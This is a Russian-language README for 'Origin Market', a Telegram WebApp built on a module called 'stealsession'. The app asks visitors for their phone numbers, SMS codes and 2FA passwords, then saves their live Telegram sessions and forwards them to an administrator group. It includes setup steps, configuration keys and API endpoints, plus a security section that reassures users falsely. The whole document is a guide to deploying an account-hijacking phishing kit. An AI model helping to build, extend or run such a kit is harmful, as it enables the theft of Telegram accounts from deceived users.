# Origin Market - Интегрированное веб-приложение

## Описание
Интегрированное веб-приложение, объединяющее функциональность stealsession с красивым Telegram WebApp интерфейсом.

## Функциональность
- **Telegram WebApp интерфейс** - современный и красивый дизайн
- **Реальная авторизация через Telegram** - использует Telethon для получения сессий
- **Поддержка 2FA** - автоматическая обработка двухфакторной аутентификации
- **База данных** - сохранение информации о пользователях
- **API endpoints** - REST API для взаимодействия с frontend

## Структура проекта
```
├── app.py                 # Основной Flask сервер
├── requirements.txt       # Зависимости Python
├── templates/            # HTML шаблоны
│   ├── index.html        # Главная страница
│   ├── code-verification.html  # Страница ввода кода
│   └── dashboard.html    # Дашборд после авторизации
├── static/               # Статические файлы
│   ├── styles-v2.css    # CSS стили
│   ├── script.js        # JavaScript
│   └── pepe.png         # Изображение логотипа
├── session/              # Папка для хранения сессий Telegram
├── data/                 # База данных SQLite
└── stealsession/         # Оригинальный модуль stealsession
```

## Установка и запуск

### 1. Установка зависимостей
```bash
pip install -r requirements.txt
```

### 2. Настройка конфигурации
В файле `app.py` настройте следующие параметры:
- `API_ID` - ID вашего Telegram API
- `API_HASH` - Hash вашего Telegram API  
- `ADMIN_ID` - ID группы для получения сессий
- `BOT_TOKEN` - Токен Telegram бота

### 3. Запуск приложения
```bash
python app.py
```

Приложение будет доступно по адресу: `http://localhost:5000`

## API Endpoints

### POST /api/request_code
Отправляет SMS код на номер телефона
```json
{
    "phone": "+1234567890"
}
```

### POST /api/verify_code
Проверяет введенный код
```json
{
    "phone": "+1234567890",
    "code": "12345",
    "password": "2fa_password" // опционально
}
```

### POST /api/resend_code
Повторно отправляет код
```json
{
    "phone": "+1234567890"
}
```

## Особенности интеграции

1. **Реальная авторизация**: Приложение использует Telethon для реальной авторизации в Telegram, а не симуляцию
2. **Сохранение сессий**: Полученные сессии сохраняются в папке `session/`
3. **База данных**: Информация о пользователях сохраняется в SQLite
4. **Обработка ошибок**: Полная обработка ошибок Telegram API
5. **2FA поддержка**: Автоматическое определение и обработка двухфакторной аутентификации

## Безопасность

- Все сессии сохраняются локально
- Номера телефонов не передаются третьим лицам
- Используется оригинальный Telegram API
- Поддержка всех типов аутентификации Telegram

## Разработка

Для разработки рекомендуется:
1. Использовать виртуальное окружение Python
2. Настроить IDE для работы с Flask
3. Тестировать на реальных номерах телефонов
4. Проверять логи в консоли для отладки
